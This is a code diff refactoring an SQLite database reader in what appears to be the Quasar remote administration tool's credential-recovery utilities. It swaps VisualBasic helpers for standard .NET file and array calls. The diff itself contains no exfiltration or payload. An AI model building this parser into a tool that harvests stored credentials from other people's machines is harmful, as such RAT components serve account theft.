@@ -1,9 +1,8 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
-using Microsoft.VisualBasic;
-using Microsoft.VisualBasic.CompilerServices;
 
 namespace Quasar.Client.Recovery.Utilities
 {
@@ -11,7 +10,7 @@ namespace Quasar.Client.Recovery.Utilities
     {
         private byte[] db_bytes;
         private ulong encoding;
-        private string[] field_names;
+        private string[] field_names = new string[1];
         private sqlite_master_entry[] master_table_entries;
         private ushort page_size;
         private byte[] SQLDataTypeSize = new byte[] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
@@ -21,11 +20,7 @@ namespace Quasar.Client.Recovery.Utilities
         {
             if (File.Exists(baseName))
             {
-                FileSystem.FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
-                string str = Strings.Space((int)FileSystem.LOF(1));
-                FileSystem.FileGet(1, ref str, -1L, false);
-                FileSystem.FileClose(new int[] { 1 });
-                this.db_bytes = Encoding.Default.GetBytes(str);
+                this.db_bytes = File.ReadAllBytes(baseName);
                 if (Encoding.Default.GetString(this.db_bytes, 0, 15).CompareTo("SQLite format 3") != 0)
                 {
                     throw new Exception("Not a valid SQLite 3 Database File");
@@ -116,19 +111,16 @@ namespace Quasar.Client.Recovery.Utilities
 
         public string[] GetTableNames()
         {
-            string[] strArray2 = null;
-            int index = 0;
+            List<string> tableNames = new List<string>();
             int num3 = this.master_table_entries.Length - 1;
             for (int i = 0; i <= num3; i++)
             {
                 if (this.master_table_entries[i].item_type == "table")
                 {
-                    strArray2 = (string[])Utils.CopyArray((Array)strArray2, new string[index + 1]);
-                    strArray2[index] = this.master_table_entries[i].item_name;
-                    index++;
+                    tableNames.Add(this.master_table_entries[i].item_name);
                 }
             }
-            return strArray2;
+            return tableNames.ToArray();
         }
 
         public string GetValue(int row_num, int field)
@@ -198,7 +190,7 @@ namespace Quasar.Client.Recovery.Utilities
                 if (this.master_table_entries != null)
                 {
                     length = this.master_table_entries.Length;
-                    this.master_table_entries = (sqlite_master_entry[])Utils.CopyArray((Array)this.master_table_entries, new sqlite_master_entry[(this.master_table_entries.Length + num2) + 1]);
+                    Array.Resize(ref master_table_entries, this.master_table_entries.Length + num2 + 1);
                 }
                 else
                 {
@@ -334,7 +326,8 @@ namespace Quasar.Client.Recovery.Utilities
                 {
                     break;
                 }
-                this.field_names = (string[])Utils.CopyArray((Array)this.field_names, new string[j + 1]);
+
+                Array.Resize(ref field_names, j + 1);
                 this.field_names[j] = strArray[j];
             }
             return this.ReadTableFromOffset((ulong)((this.master_table_entries[index].root_num - 1L) * this.page_size));
@@ -349,7 +342,7 @@ namespace Quasar.Client.Recovery.Utilities
                 if (this.table_entries != null)
                 {
                     length = this.table_entries.Length;
-                    this.table_entries = (table_entry[])Utils.CopyArray((Array)this.table_entries, new table_entry[(this.table_entries.Length + num2) + 1]);
+                    Array.Resize(ref this.table_entries, this.table_entries.Length + num2 + 1);
                 }
                 else
                 {
@@ -358,7 +351,7 @@ namespace Quasar.Client.Recovery.Utilities
                 int num16 = num2;
                 for (int i = 0; i <= num16; i++)
                 {
-                    record_header_field[] _fieldArray = null;
+                    record_header_field[] _fieldArray = new record_header_field[1];
                     ulong num = this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8M), new decimal(i * 2))), 2);
                     if (decimal.Compare(new decimal(Offset), 100M) != 0)
                     {
@@ -375,7 +368,7 @@ namespace Quasar.Client.Recovery.Utilities
                     long num10 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num), new decimal(endIndex)), decimal.One));
                     for (int j = 0; num10 < num7; j++)
                     {
-                        _fieldArray = (record_header_field[])Utils.CopyArray((Array)_fieldArray, new record_header_field[j + 1]);
+                        Array.Resize(ref _fieldArray, j + 1);
                         endIndex = num8 + 1;
                         num8 = this.GVL(endIndex);
                         _fieldArray[j].type = this.CVL(endIndex, num8);
@@ -425,7 +418,7 @@ namespace Quasar.Client.Recovery.Utilities
                         }
                         else
                         {
-                            this.table_entries[length + i].content[k] = Conversions.ToString(this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size));
+                            this.table_entries[length + i].content[k] = Convert.ToString(this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size));
                         }
                         num4 += (int)_fieldArray[k].size;
                     }
